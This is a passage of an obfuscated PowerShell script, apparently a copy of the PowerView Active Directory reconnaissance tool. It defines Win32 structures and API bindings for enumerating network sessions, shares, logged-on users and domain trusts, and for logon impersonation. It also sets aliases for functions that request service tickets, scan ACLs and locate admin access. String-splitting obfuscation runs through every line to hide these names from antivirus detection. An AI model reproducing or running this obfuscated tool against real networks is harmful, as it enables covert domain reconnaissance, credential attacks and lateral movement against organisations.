    ("{2}{0}{3}{1}"-f 'ne','ed','Con','ct')    =    1
    ("{2}{3}{0}{1}" -f'nect','Query','C','on') =    2
    ("{0}{1}"-f 'Sh','adow')       =    3
    ("{2}{1}{0}"-f'ected','conn','Dis') =    4
    ("{0}{1}" -f'Id','le')         =    5
    ("{1}{0}"-f 'ten','Lis')       =    6
    ("{0}{1}" -f'R','eset')        =    7
    ("{1}{0}" -f 'n','Dow')         =    8
    ("{0}{1}" -f'In','it')         =    9
}


${wTS_SE`S`SIoN_`in`Fo_1} = &("{1}{0}" -f 't','struc') ${m`od} ("{4}{3}{1}{0}{2}"-f 'e','DPS','ssionInfo','erView.R','Pow') @{
    ("{1}{0}{2}{3}" -f 'x','E','ec','EnvId') = &("{0}{1}"-f'fie','ld') 0 ("{0}{1}"-f'UInt3','2')
    ("{0}{1}" -f'Stat','e') = &("{1}{0}" -f'ld','fie') 1 ${wt`Sco`N`NecTSt`ATe}
    ("{2}{1}{0}"-f 'd','I','Session') = &("{1}{0}"-f 'ld','fie') 2 ("{1}{2}{0}" -f 't32','U','In')
    ("{0}{1}{3}{2}"-f'p','S','me','essionNa') = &("{1}{0}"-f'ld','fie') 3 ("{1}{0}" -f'ng','Stri') -MarshalAs @(("{1}{0}"-f'tr','LPWS'))
    ("{1}{2}{0}" -f'stName','pH','o') = &("{1}{0}" -f'd','fiel') 4 ("{1}{0}" -f'ng','Stri') -MarshalAs @(("{1}{0}" -f'PWStr','L'))
    ("{1}{0}{2}" -f'Us','p','erName') = &("{0}{1}"-f'fie','ld') 5 ("{1}{2}{0}"-f 'ng','St','ri') -MarshalAs @(("{1}{0}" -f'Str','LPW'))
    ("{1}{0}{2}" -f 'DomainNa','p','me') = &("{1}{0}"-f 'ld','fie') 6 ("{2}{1}{0}"-f'ng','tri','S') -MarshalAs @(("{0}{1}"-f 'LP','WStr'))
    ("{2}{1}{0}" -f'me','mNa','pFar') = &("{1}{0}" -f 'eld','fi') 7 ("{0}{2}{1}"-f'S','ring','t') -MarshalAs @(("{1}{2}{0}" -f 'r','L','PWSt'))
}


${wtS_ClI`ENT_`A`ddress} = &("{1}{0}" -f'uct','str') ${m`OD} ("{0}{1}{3}{5}{2}{4}"-f 'W','T','CLIE','S','NT_ADDRESS','_') @{
    ("{1}{0}{2}"-f'dr','Ad','essFamily') = &("{1}{0}" -f 'eld','fi') 0 ("{1}{0}"-f'32','UInt')
    ("{1}{2}{0}"-f'ss','Addr','e') = &("{0}{1}"-f'fie','ld') 1 ("{2}{0}{1}" -f 'e','[]','Byt') -MarshalAs @(("{0}{1}{2}"-f 'B','yValAr','ray'), 20)
}


${shaR`e_`INFo_1} = &("{1}{0}"-f't','struc') ${M`Od} ("{2}{3}{0}{1}{4}"-f'erV','iew.Shar','Po','w','eInfo') @{
    ("{1}{0}"-f 'ame','N') = &("{1}{0}" -f'ld','fie') 0 ("{0}{1}"-f'Stri','ng') -MarshalAs @(("{0}{1}"-f 'LPWS','tr'))
    ("{0}{1}" -f 'Ty','pe') = &("{1}{0}" -f'ield','f') 1 ("{0}{1}"-f'UI','nt32')
    ("{0}{1}" -f 'Rem','ark') = &("{0}{1}" -f'fiel','d') 2 ("{0}{1}" -f 'S','tring') -MarshalAs @(("{1}{2}{0}" -f 'Str','LP','W'))
}


${WKS`T`A_USER_I`N`Fo`_1} = &("{0}{1}{2}"-f'st','ruc','t') ${M`Od} ("{2}{5}{1}{4}{0}{3}{6}"-f'ged','w.L','Po','OnUserI','og','werVie','nfo') @{
    ("{0}{1}{2}" -f'UserN','am','e') = &("{1}{0}"-f 'ld','fie') 0 ("{1}{0}" -f 'ring','St') -MarshalAs @(("{0}{1}" -f'LPWSt','r'))
    ("{1}{0}{2}" -f'oma','LogonD','in') = &("{0}{1}"-f'f','ield') 1 ("{2}{1}{0}" -f 'ing','tr','S') -MarshalAs @(("{1}{0}"-f 'PWStr','L'))
    ("{2}{0}{1}"-f'hDoma','ins','Aut') = &("{0}{1}"-f'fie','ld') 2 ("{2}{1}{0}" -f 'g','rin','St') -MarshalAs @(("{0}{1}" -f'LP','WStr'))
    ("{0}{1}{2}" -f 'Lo','go','nServer') = &("{1}{0}"-f 'eld','fi') 3 ("{1}{0}"-f'g','Strin') -MarshalAs @(("{1}{0}" -f 'WStr','LP'))
}


${se`SSion_I`Nfo`_`10} = &("{0}{1}"-f 'str','uct') ${M`Od} ("{4}{0}{6}{1}{5}{3}{2}" -f 'rV','w.','fo','n','Powe','SessionI','ie') @{
    ("{0}{1}"-f'C','Name') = &("{1}{0}"-f'ld','fie') 0 ("{1}{0}"-f 'ring','St') -MarshalAs @(("{0}{1}" -f'LP','WStr'))
    ("{2}{1}{0}"-f'ame','rN','Use') = &("{0}{1}"-f'fie','ld') 1 ("{1}{0}" -f 'ing','Str') -MarshalAs @(("{1}{0}"-f 'Str','LPW'))
    ("{1}{0}"-f'me','Ti') = &("{1}{0}"-f'ld','fie') 2 ("{1}{0}{2}" -f 'In','U','t32')
    ("{1}{0}{2}"-f'd','I','leTime') = &("{0}{1}" -f 'fiel','d') 3 ("{0}{1}" -f 'UInt3','2')
}


${s`ID`_`NA`me_UsE} = &("{1}{0}" -f'senum','p') ${M`Od} ("{3}{2}{0}{1}" -f '_NA','ME_USE','D','SI') ("{1}{0}" -f'nt16','UI') @{
    ("{2}{1}{0}"-f'r','idTypeUse','S')             = 1
    ("{0}{2}{1}" -f 'S','TypeGroup','id')            = 2
    ("{2}{0}{1}{3}"-f 'oma','i','SidTypeD','n')           = 3
    ("{0}{2}{3}{1}" -f'Sid','s','TypeAli','a')            = 4
    ("{3}{2}{0}{5}{1}{4}" -f 'pe','ell','dTy','Si','KnownGroup','W')   = 5
    ("{4}{3}{0}{2}{1}" -f 'dAc','unt','co','eDelete','SidTyp')   = 6
    ("{3}{4}{1}{2}{0}" -f 'nvalid','Type','I','Si','d')          = 7
    ("{1}{0}{2}{3}" -f 'Ty','Sid','peU','nknown')          = 8
    ("{0}{4}{1}{2}{3}" -f 'Si','ype','Comput','er','dT')         = 9
}


${LOCAlgRouP_`i`N`FO`_1} = &("{0}{1}"-f 'struc','t') ${m`od} ("{0}{2}{3}{1}" -f 'L','NFO_1','OCALGROU','P_I') @{
    ("{2}{1}{0}"-f'1_name','pi','lgr') = &("{1}{0}"-f 'eld','fi') 0 ("{0}{2}{1}"-f'S','g','trin') -MarshalAs @(("{1}{2}{0}"-f 'WStr','L','P'))
    ("{0}{1}{3}{2}" -f 'lg','r','ment','pi1_com') = &("{0}{1}" -f 'fi','eld') 1 ("{0}{1}" -f 'St','ring') -MarshalAs @(("{0}{1}" -f 'LP','WStr'))
}


${loCal`gROup_`MeMBErS`_inF`O_2} = &("{1}{0}" -f'ruct','st') ${M`od} ("{3}{6}{2}{5}{1}{0}{4}" -f 'S_INFO','MEMBER','CALGROUP','L','_2','_','O') @{
    ("{2}{0}{1}"-f 'i','d','lgrmi2_s') = &("{0}{1}" -f'f','ield') 0 ("{1}{0}" -f 'r','IntPt')
    ("{4}{3}{2}{1}{0}" -f'dusage','i','_s','grmi2','l') = &("{1}{0}"-f'ld','fie') 1 ${sid_`N`AM`E_uSe}
    ("{0}{3}{1}{2}" -f 'lgrmi2_','ainand','name','dom') = &("{1}{0}"-f 'ield','f') 2 ("{0}{1}"-f 'Str','ing') -MarshalAs @(("{0}{1}"-f 'L','PWStr'))
}


${d`SDomA`Infl`AG} = &("{0}{1}" -f 'psen','um') ${m`Od} ("{0}{3}{2}{1}" -f 'Ds','ags','Fl','Domain.') ("{0}{1}" -f'UIn','t32') @{
    ("{1}{2}{0}" -f 'ST','IN_FO','RE')       = 1
    ("{1}{3}{4}{2}{0}"-f 'ND','D','BOU','IRECT_OU','T') = 2
    ("{1}{2}{0}" -f'T','TR','EE_ROO')       = 4
    ("{0}{1}"-f 'P','RIMARY')         = 8
    ("{2}{0}{1}" -f 'MO','DE','NATIVE_')     = 16
    ("{0}{4}{3}{1}{2}"-f'D','O','UND','_INB','IRECT')  = 32
} -Bitfield
${dS`domaIn`T`RusTtyPE} = &("{0}{1}"-f'psenu','m') ${M`Od} ("{3}{1}{2}{4}{0}"-f 'in.TrustType','sD','om','D','a') ("{1}{0}"-f'2','UInt3') @{
    ("{2}{0}{1}" -f 'O','WNLEVEL','D')   = 1
    ("{0}{2}{1}" -f 'U','EL','PLEV')     = 2
    ("{0}{1}"-f'MI','T')         = 3
    ("{1}{0}"-f'E','DC')         = 4
}
${dsDomAIN`TRUs`T`ATt`RIbUt`eS} = &("{0}{1}"-f 'psenu','m') ${m`OD} ("{2}{0}{3}{6}{4}{5}{1}" -f'D','s','Ds','o','Attri','bute','main.Trust') ("{1}{0}" -f '32','UInt') @{
    ("{3}{2}{0}{1}" -f'IV','E','TRANSIT','NON_')      = 1
    ("{1}{0}{3}{2}"-f'E','UPL','Y','VEL_ONL')        = 2
    ("{1}{3}{0}{2}" -f 'T','F','ER_SIDS','IL')         = 4
    ("{2}{0}{3}{1}"-f 'TRA','ITIVE','FOREST_','NS')   = 8
    ("{2}{3}{0}{1}"-f 'ZA','TION','CROSS_ORGAN','I')  = 16
    ("{0}{3}{2}{4}{1}" -f'W','EST','T','I','HIN_FOR')       = 32
    ("{1}{0}{3}{2}" -f 'X','TREAT_AS_E','NAL','TER')   = 64
}


${Ds_doM`AI`N_TR`U`Sts} = &("{0}{1}" -f 'stru','ct') ${M`OD} ("{3}{1}{2}{0}{4}" -f'RUST','DOMAI','N_T','DS_','S') @{
    ("{0}{3}{2}{1}"-f 'N','ainName','m','etbiosDo') = &("{1}{0}" -f 'eld','fi') 0 ("{1}{0}"-f 'ing','Str') -MarshalAs @(("{0}{1}" -f'L','PWStr'))
    ("{0}{1}{2}"-f 'Dn','sDo','mainName') = &("{0}{1}"-f'fie','ld') 1 ("{0}{1}" -f 'Str','ing') -MarshalAs @(("{0}{1}" -f 'LPWSt','r'))
    ("{1}{0}"-f'ags','Fl') = &("{0}{1}"-f'fiel','d') 2 ${dsDO`M`AiNFLAg}
    ("{3}{1}{2}{0}"-f'dex','e','ntIn','Par') = &("{0}{1}" -f'fi','eld') 3 ("{1}{0}" -f'nt32','UI')
    ("{0}{1}{2}"-f 'Tru','stTyp','e') = &("{0}{1}" -f 'fie','ld') 4 ${Ds`dO`MA`InT`Rus`TTYpE}
    ("{1}{4}{0}{2}{3}"-f 'ttr','Trust','ibute','s','A') = &("{0}{1}" -f'fiel','d') 5 ${dS`d`OM`A`iN`TruStATTRI`ButEs}
    ("{2}{0}{1}"-f'main','Sid','Do') = &("{1}{0}"-f'ld','fie') 6 ("{1}{0}" -f'tPtr','In')
    ("{1}{3}{0}{2}"-f'inGu','Dom','id','a') = &("{1}{0}"-f'd','fiel') 7 ("{1}{0}" -f'd','Gui')
}


${neTR`ESO`URCEw} = &("{1}{2}{0}"-f't','s','truc') ${m`oD} ("{0}{3}{2}{1}"-f'NETR','EW','RC','ESOU') @{
    ("{0}{1}" -f 'dwSc','ope') =         &("{0}{1}" -f'fi','eld') 0 ("{1}{0}" -f'nt32','UI')
    ("{1}{2}{0}"-f 'e','d','wTyp') =          &("{1}{0}"-f'ield','f') 1 ("{0}{1}"-f 'U','Int32')
    ("{0}{3}{2}{1}" -f 'dw','ype','ayT','Displ') =   &("{0}{1}" -f'f','ield') 2 ("{0}{1}"-f'UI','nt32')
    ("{1}{0}"-f'e','dwUsag') =         &("{1}{0}"-f'ld','fie') 3 ("{0}{1}"-f 'UInt3','2')
    ("{1}{2}{0}"-f 'Name','lp','Local') =     &("{1}{0}" -f 'd','fiel') 4 ("{1}{0}"-f 'ring','St') -MarshalAs @(("{0}{2}{1}" -f 'LPW','tr','S'))
    ("{0}{1}{2}" -f'l','pRem','oteName') =    &("{0}{1}" -f 'fiel','d') 5 ("{0}{1}"-f 'S','tring') -MarshalAs @(("{1}{0}" -f'r','LPWSt'))
    ("{0}{2}{1}" -f'lpComme','t','n') =       &("{1}{0}" -f'ld','fie') 6 ("{2}{1}{0}" -f 'ing','r','St') -MarshalAs @(("{0}{1}"-f 'LPW','Str'))
    ("{2}{1}{0}"-f 'der','i','lpProv') =      &("{1}{0}" -f 'eld','fi') 7 ("{1}{0}"-f 'g','Strin') -MarshalAs @(("{0}{2}{1}"-f'LP','tr','WS'))
}


${fu`NcTiONdEF`In`It`I`o`NS} = @(
    (&("{0}{1}" -f 'fun','c') ("{1}{0}"-f'i32','netap') ("{3}{1}{2}{0}"-f'eEnum','t','Shar','Ne') ([Int]) @([String], [Int],  (gi ("{1}{2}{0}"-f 'Ble:zfVw1','VA','RIa')  )."VA`lUe".("{3}{1}{0}{4}{2}"-f 'e','R','Type','MakeBy','f').Invoke(), [Int],   ( Gi ("VARiabLE:"+"Y7"+"dx"+"W"))."vaL`Ue".("{3}{4}{0}{1}{2}"-f'f','Ty','pe','Mak','eByRe').Invoke(),   (GEt-vARiabLE  ('Y7'+'DXw') -vaLUeON ).("{0}{3}{4}{2}{1}" -f'M','e','eByRefTyp','a','k').Invoke(),   ${Y7`d`XW}.("{3}{4}{1}{2}{0}" -f 'fType','R','e','Make','By').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{2}{1}{0}" -f '2','etapi3','n') ("{1}{3}{0}{2}{4}" -f 'aUserE','N','n','etWkst','um') ([Int]) @([String], [Int],   ${z`FVW1}.("{0}{3}{1}{2}" -f'MakeByR','y','pe','efT').Invoke(), [Int],  ( vaRiablE  ("{0}{1}"-f'y','7DXW') -ValUeo  ).("{1}{0}{2}" -f 'ByRefTyp','Make','e').Invoke(),  (  ls  ("{0}{2}{3}{1}{4}"-f 'Var','E:Y7','I','AbL','dxw'))."VaL`UE".("{4}{3}{0}{1}{2}"-f'f','Typ','e','Re','MakeBy').Invoke(),  ${Y7D`Xw}.("{1}{0}{3}{2}" -f 'y','MakeB','efType','R').Invoke())),
    (&("{1}{0}" -f'nc','fu') ("{2}{1}{0}"-f 'tapi32','e','n') ("{3}{0}{2}{1}"-f 'et','nEnum','Sessio','N') ([Int]) @([String], [String], [String], [Int],  ${zfV`w1}.("{0}{2}{1}" -f 'Ma','pe','keByRefTy').Invoke(), [Int],  ${Y7D`XW}.("{0}{2}{1}"-f'M','ype','akeByRefT').Invoke(),   ${Y7`Dxw}.("{1}{2}{0}"-f'Type','MakeByRe','f').Invoke(),   ( dIr  ('vAri'+'Able:'+'y7Dxw') )."V`ALUe".("{1}{0}{2}"-f'ke','Ma','ByRefType').Invoke())),
    (&("{1}{0}" -f 'unc','f') ("{1}{0}"-f '2','netapi3') ("{1}{3}{2}{0}" -f 'num','NetLocal','roupE','G') ([Int]) @([String], [Int],  (ls ("V"+"Ari"+"a"+"BlE:ZFvw1"))."v`AluE".("{1}{2}{0}{4}{3}"-f 'eB','Ma','k','RefType','y').Invoke(), [Int],   ( VariabLE ('Y7d'+'XW'))."VAL`UE".("{1}{0}{3}{2}"-f'RefTy','MakeBy','e','p').Invoke(),   ${Y`7DxW}.("{0}{4}{2}{3}{1}"-f'Mak','ype','f','T','eByRe').Invoke(),  ${Y7d`XW}.("{0}{2}{1}" -f 'Ma','ByRefType','ke').Invoke())),
    (&("{1}{0}"-f 'nc','fu') ("{0}{1}"-f'net','api32') ("{1}{4}{0}{2}{3}" -f 'calGrou','Ne','pGetMember','s','tLo') ([Int]) @([String], [String], [Int],   ( chiLdiTeM  ('vaRIAb'+'LE:ZF'+'v'+'W'+'1') )."VAl`Ue".("{1}{2}{3}{0}" -f 'pe','Ma','keB','yRefTy').Invoke(), [Int],   (  geT-VArIaBLe  ('Y7D'+'xW') -ValUeo ).("{3}{0}{1}{2}" -f'By','RefT','ype','Make').Invoke(),   ( VarIabLe ('y'+'7Dxw')  -va).("{3}{0}{4}{2}{1}" -f'y','Type','f','MakeB','Re').Invoke(),   (ls  ("{3}{0}{2}{1}"-f 'Y7','xw','d','vARIable:'))."V`AlUe".("{3}{1}{2}{0}"-f'e','R','efTyp','MakeBy').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{0}{2}{1}"-f 'n','api32','et') ("{3}{0}{2}{1}" -f 'e','e','Nam','DsGetSit') ([Int]) @([String],   (gci ("{2}{1}{4}{0}{3}"-f 'FvW','ABL','Vari','1','E:Z') )."va`lUE".("{0}{3}{1}{4}{2}" -f 'MakeByR','Ty','e','ef','p').Invoke())),
    (&("{0}{1}" -f 'fun','c') ("{0}{1}{2}" -f'n','eta','pi32') ("{1}{3}{2}{0}{5}{4}" -f'Doma','Ds','te','Enumera','sts','inTru') ([Int]) @([String], [UInt32],   ${Z`FV`w1}.("{2}{4}{3}{1}{0}" -f'ype','efT','MakeB','R','y').Invoke(),  ${z`Fv`w1}.("{2}{4}{0}{3}{1}"-f 'Ty','e','M','p','akeByRef').Invoke())),
    (&("{0}{1}"-f'f','unc') ("{0}{1}" -f 'netapi3','2') ("{3}{1}{0}{2}" -f 're','ferF','e','NetApiBuf') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'unc','f') ("{0}{2}{1}" -f'ad','pi32','va') ("{4}{0}{3}{6}{5}{1}{2}"-f'Si','i','d','dTo','Convert','ngS','Stri') ([Int]) @([IntPtr],  (  gEt-ITem  ("VaRiab"+"LE:k"+"D"+"L"+"P") )."vA`luE".("{2}{3}{0}{1}" -f 'keByRe','fType','M','a').Invoke()) -SetLastError),
    (&("{1}{0}"-f 'nc','fu') ("{1}{0}" -f '32','advapi') ("{1}{0}{3}{2}" -f'nS','Ope','rW','CManage') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{0}{1}" -f'f','unc') ("{0}{2}{1}" -f 'advap','32','i') ("{2}{3}{0}{1}" -f 'Ser','viceHandle','Cl','ose') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'c','fun') ("{1}{0}{2}"-f 'pi','adva','32') ("{0}{1}{2}" -f 'Logon','Use','r') ([Bool]) @([String], [String], [String], [UInt32], [UInt32],  ${ZF`Vw1}.("{3}{2}{4}{0}{1}" -f'B','yRefType','a','M','ke').Invoke()) -SetLastError),
    (&("{0}{1}" -f'fun','c') ("{1}{0}{2}"-f 'dvapi','a','32') ("{1}{0}{2}{4}{3}"-f'L','Impersonate','ogg','User','edOn') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{1}{0}"-f'unc','f') ("{0}{1}"-f 'advap','i32') ("{2}{0}{1}"-f'tTo','Self','Rever') ([Bool]) @() -SetLastError),
    (&("{1}{0}"-f 'c','fun') ("{1}{2}{0}" -f'32','w','tsapi') ("{1}{4}{2}{3}{0}"-f'Ex','WTSO','nS','erver','pe') ([IntPtr]) @([String])),
    (&("{1}{0}" -f 'nc','fu') ("{0}{2}{1}"-f 'wts','pi32','a') ("{4}{2}{3}{1}{0}" -f 'sionsEx','rateSes','T','SEnume','W') ([Int]) @([IntPtr],  ( VaRiaBLE ("{1}{0}" -f 'dXw','y7'))."VAl`Ue".("{2}{0}{1}{3}"-f'By','R','Make','efType').Invoke(), [Int],   (  VArIable ("{1}{0}"-f'fVW1','Z'))."V`Alue".("{4}{2}{0}{3}{1}" -f 'eByRefT','e','k','yp','Ma').Invoke(),   ( GEt-iTEm  ('VarI'+'ABL'+'E:y7dxw') )."vAL`Ue".("{1}{2}{0}"-f 'ype','MakeByRe','fT').Invoke()) -SetLastError),
    (&("{0}{1}"-f'f','unc') ("{1}{0}{2}"-f 'tsapi3','w','2') ("{0}{3}{1}{2}{4}"-f'WTS','uerySessi','onInformatio','Q','n') ([Int]) @([IntPtr], [Int], [Int],  (GCI  ("V"+"aRiAB"+"Le"+":zFvW1"))."v`AluE".("{1}{2}{3}{0}"-f 'e','MakeB','yRe','fTyp').Invoke(),  ( GET-VArIaBLE ("Y7"+"dXW")  )."V`AlUe".("{0}{3}{2}{1}" -f'Ma','fType','e','keByR').Invoke()) -SetLastError),
    (&("{1}{0}" -f 'unc','f') ("{0}{2}{1}" -f'w','sapi32','t') ("{3}{1}{2}{0}" -f 'oryEx','F','reeMem','WTS') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{1}{0}"-f'nc','fu') ("{1}{0}{2}" -f's','wt','api32') ("{2}{1}{0}{3}"-f'mor','SFreeMe','WT','y') ([Int]) @([IntPtr])),
    (&("{0}{1}" -f'fun','c') ("{2}{1}{0}" -f'32','i','wtsap') ("{2}{0}{1}{3}"-f 'C','loseServe','WTS','r') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'c','fun') ("{0}{1}" -f 'Mp','r') ("{2}{3}{4}{0}{1}"-f'nnec','tion2W','WNet','Ad','dCo') ([Int]) @(${NEt`Reso`Urc`eW}, [String], [String], [UInt32])),
    (&("{0}{1}" -f'fu','nc') ("{1}{0}"-f'r','Mp') ("{1}{2}{3}{0}" -f'on2','WNetCancelCo','nnec','ti') ([Int]) @([String], [Int], [Bool])),
    (&("{0}{1}" -f'f','unc') ("{2}{1}{0}" -f 'el32','ern','k') ("{0}{2}{1}" -f 'CloseH','e','andl') ([Bool]) @([IntPtr]) -SetLastError)
)

${TyP`ES} = ${F`U`NcTIondefi`NItiO`Ns} | &("{2}{0}{3}{1}" -f 'd-','in32Type','Ad','W') -Module ${M`OD} -Namespace ("{0}{1}"-f 'Win','32')
${N`ET`Api32} = ${ty`p`es}[("{2}{1}{0}"-f'i32','ap','net')]
${a`dv`API32} = ${tyP`ES}[("{1}{2}{0}"-f'32','adva','pi')]
${wtsaP`I32} = ${t`YP`es}[("{2}{1}{0}"-f '32','pi','wtsa')]
${M`Pr} = ${T`ypES}['Mpr']
${KErN`E`l32} = ${TYp`eS}[("{0}{1}"-f 'ke','rnel32')]

&("{0}{2}{1}" -f 'S','lias','et-A') ("{2}{1}{0}" -f 't-IPAddress','e','G') ("{1}{3}{4}{2}{0}{5}"-f's','Resolve-I','e','PA','ddr','s')
&("{2}{0}{1}" -f 't-Alia','s','Se') ("{4}{3}{1}{2}{0}"-f'ameToSid','t-','N','onver','C') ("{0}{2}{1}"-f'ConvertTo','D','-SI')
&("{1}{2}{0}" -f 'ias','Set-','Al') ("{4}{1}{3}{2}{0}"-f'ame','ert-S','ToN','id','Conv') ("{1}{0}{2}"-f'nvert','Co','From-SID')
&("{2}{1}{0}" -f'lias','-A','Set') ("{1}{4}{0}{2}{3}"-f'quest','R','-SPNTic','ket','e') ("{3}{2}{0}{1}{4}"-f 'ick','e','mainSPNT','Get-Do','t')
&("{1}{0}{2}" -f'a','Set-Ali','s') ("{3}{2}{1}{0}"-f'ne','DNSZo','et-','G') ("{0}{3}{1}{2}" -f'Get-','omai','nDNSZone','D')
&("{0}{1}"-f'S','et-Alias') ("{2}{0}{1}{3}" -f'o','r','Get-DNSRec','d') ("{3}{5}{4}{6}{0}{1}{2}"-f'm','ain','DNSRecord','Ge','D','t-','o')
&("{2}{0}{1}"-f'et-A','lias','S') ("{2}{1}{0}" -f 'omain','et-NetD','G') ("{1}{0}{2}" -f '-D','Get','omain')
&("{0}{1}{2}"-f'Set','-Al','ias') ("{5}{1}{4}{0}{2}{3}" -f'ain','et','Controlle','r','-NetDom','G') ("{3}{5}{6}{4}{1}{0}{2}"-f'l','l','er','Ge','Contro','t','-Domain')
&("{3}{1}{2}{0}"-f 's','et','-Alia','S') ("{3}{0}{1}{4}{2}" -f 'e','t-N','st','G','etFore') ("{1}{2}{0}" -f 'st','Get-','Fore')
&("{2}{3}{0}{1}" -f 'li','as','Se','t-A') ("{0}{4}{3}{2}{5}{1}"-f 'Get-','n','ForestDom','t','Ne','ai') ("{2}{3}{4}{0}{1}" -f 'i','n','Get-Fore','st','Doma')
&("{2}{0}{1}" -f't-Alia','s','Se') ("{0}{4}{2}{3}{1}"-f 'Ge','talog','o','restCa','t-NetF') ("{6}{0}{2}{3}{5}{1}{4}" -f 't','lo','-F','orestGlob','g','alCata','Ge')
&("{2}{0}{1}"-f'Ali','as','Set-') ("{1}{0}{2}{3}" -f 'et','Get-N','Use','r') ("{0}{1}{2}"-f'G','et-DomainUs','er')
&("{0}{1}" -f'Set-Al','ias') ("{3}{2}{0}{1}"-f 've','nt','serE','Get-U') ("{1}{4}{0}{2}{5}{3}"-f '-Dom','Ge','ainUs','Event','t','er')
&("{2}{0}{3}{1}"-f't-','as','Se','Ali') ("{1}{3}{2}{0}"-f'ter','Get-Net','pu','Com') ("{3}{2}{0}{1}{4}" -f 'inComp','ute','-Doma','Get','r')
&("{1}{2}{0}"-f's','Set-','Alia') ("{2}{0}{1}" -f 'DObjec','t','Get-A') ("{0}{4}{1}{3}{2}" -f 'Ge','in','ject','Ob','t-Doma')
&("{1}{0}{2}"-f'-A','Set','lias') ("{0}{1}{2}" -f'Set-A','DObjec','t') ("{4}{2}{1}{0}{3}" -f'inObjec','oma','et-D','t','S')
&("{1}{0}{2}"-f't-','Se','Alias') ("{1}{4}{2}{0}{3}" -f 'tAc','Ge','-Objec','l','t') ("{1}{0}{2}{3}" -f '-DomainObje','Get','ct','Acl')
&("{0}{1}{2}"-f'Set','-Al','ias') ("{2}{1}{0}" -f'cl','tA','Add-Objec') ("{0}{3}{1}{2}" -f'Add-Domain','jec','tAcl','Ob')
&("{0}{1}{2}" -f'Set-','Alia','s') ("{1}{0}{2}{3}"-f'n','I','voke-AC','LScanner') ("{4}{2}{6}{1}{5}{0}{3}{7}"-f 'a','t','ind-','i','F','ingDom','Interes','nAcl')
&("{0}{1}{2}" -f 'Set','-A','lias') ("{0}{3}{2}{1}"-f'Get-G','ap','M','UID') ("{0}{4}{1}{5}{2}{3}"-f'G','-Dom','IDM','ap','et','ainGU')
&("{1}{2}{0}" -f 'as','Se','t-Ali') ("{2}{0}{1}" -f 'tO','U','Get-Ne') ("{1}{0}{2}" -f 'i','Get-Doma','nOU')
&("{0}{2}{1}{3}" -f'Se','Alia','t-','s') ("{1}{0}{2}"-f'it','Get-NetS','e') ("{0}{3}{2}{1}"-f'Get-D','te','i','omainS')
&("{1}{2}{0}" -f 's','Se','t-Alia') ("{3}{2}{1}{0}" -f 't','ne','ub','Get-NetS') ("{4}{3}{0}{2}{1}" -f'nS','et','ubn','i','Get-Doma')
&("{0}{2}{1}"-f'S','t-Alias','e') ("{1}{2}{3}{0}" -f 'roup','G','et-N','etG') ("{1}{2}{0}{3}" -f'-Domai','Ge','t','nGroup')
&("{0}{1}{2}" -f 'Set','-Ali','as') ("{5}{3}{0}{6}{4}{1}{7}{2}"-f'ged','y','oups','ana','curit','Find-M','Se','Gr') ("{5}{3}{0}{2}{7}{8}{1}{4}{6}"-f 'ana','i','g','inM','tyGro','Get-Doma','up','edSe','cur')
&("{0}{1}{2}" -f'Set-','Alia','s') ("{0}{3}{1}{5}{2}{4}"-f'Get-NetGro','p','m','u','ber','Me') ("{0}{4}{2}{1}{3}"-f 'Ge','Mem','oup','ber','t-DomainGr')
&("{1}{0}{2}"-f'ia','Set-Al','s') ("{2}{0}{1}{4}{3}" -f 't','-Net','Ge','rver','FileSe') ("{2}{1}{3}{0}{4}{5}"-f'F','t-Doma','Ge','in','ile','Server')
&("{1}{0}{2}" -f 'ia','Set-Al','s') ("{0}{2}{1}" -f'Get-DFSsh','e','ar') ("{3}{0}{1}{2}"-f 'ainD','F','SShare','Get-Dom')
&("{0}{2}{1}"-f 'Set-A','s','lia') ("{1}{0}{2}"-f 't-','Ge','NetGPO') ("{0}{2}{1}"-f'Get','omainGPO','-D')
&("{1}{2}{0}" -f 'Alias','S','et-') ("{1}{0}{2}"-f 'ou','Get-NetGPOGr','p') ("{5}{1}{4}{6}{2}{0}{3}" -f 'L','oma','O','ocalGroup','i','Get-D','nGP')
&("{0}{3}{1}{2}"-f 'Set-','ia','s','Al') ("{3}{4}{0}{1}{2}" -f'Loc','a','tion','Find-GP','O') ("{9}{6}{1}{5}{7}{4}{3}{2}{8}{0}{10}" -f 'lGroupMapp','-DomainG','c','o','L','P','t','OUser','a','Ge','ing')
&("{0}{1}{2}"-f'S','et-','Alias') ("{1}{4}{3}{2}{0}" -f 'n','Find-GPOC','erAdmi','mput','o') ("{3}{4}{8}{6}{1}{7}{2}{0}{5}" -f 'pi','te','pMap','Get','-Domain','ng','OCompu','rLocalGrou','GP')
&("{2}{3}{1}{0}"-f 'lias','-A','Se','t') ("{0}{3}{2}{1}" -f'Get-L','cal','ggedOnLo','o') ("{1}{4}{2}{0}{3}"-f 'Logg','Ge','eg','edOn','t-R')
&("{0}{1}" -f 'Set-A','lias') ("{1}{4}{5}{2}{3}{0}" -f 'ccess','Inv','alAdm','inA','oke-','CheckLoc') ("{1}{0}{3}{2}"-f'est','T','nAccess','-Admi')
&("{2}{0}{1}"-f 'li','as','Set-A') ("{0}{1}{3}{2}"-f 'Get-S','i','eName','t') ("{3}{5}{2}{1}{6}{4}{0}"-f 'teName','et','t-N','G','puterSi','e','Com')
&("{0}{2}{1}"-f 'Se','ias','t-Al') ("{0}{1}{3}{2}"-f 'G','e','roxy','t-P') ("{1}{2}{0}{3}" -f'IR','Get','-WM','egProxy')
&("{2}{1}{0}"-f 'lias','et-A','S') ("{2}{1}{3}{0}" -f 'ggedOn','s','Get-La','tLo') ("{3}{1}{2}{5}{4}{0}{6}"-f'd','t-WMIR','egLa','Ge','ge','stLog','On')
&("{1}{2}{0}" -f's','S','et-Alia') ("{4}{2}{0}{1}{3}"-f'dRDPCo','nnect','et-Cache','ion','G') ("{6}{2}{4}{0}{1}{3}{5}" -f'egC','ac','t-W','hedRDPC','MIR','onnection','Ge')
&("{2}{0}{1}"-f '-A','lias','Set') ("{5}{3}{4}{2}{0}{1}"-f 'Mou','ntedDrive','istry','R','eg','Get-') ("{1}{6}{3}{2}{4}{5}{0}"-f'ive','G','WMIRegMoun','-','te','dDr','et')
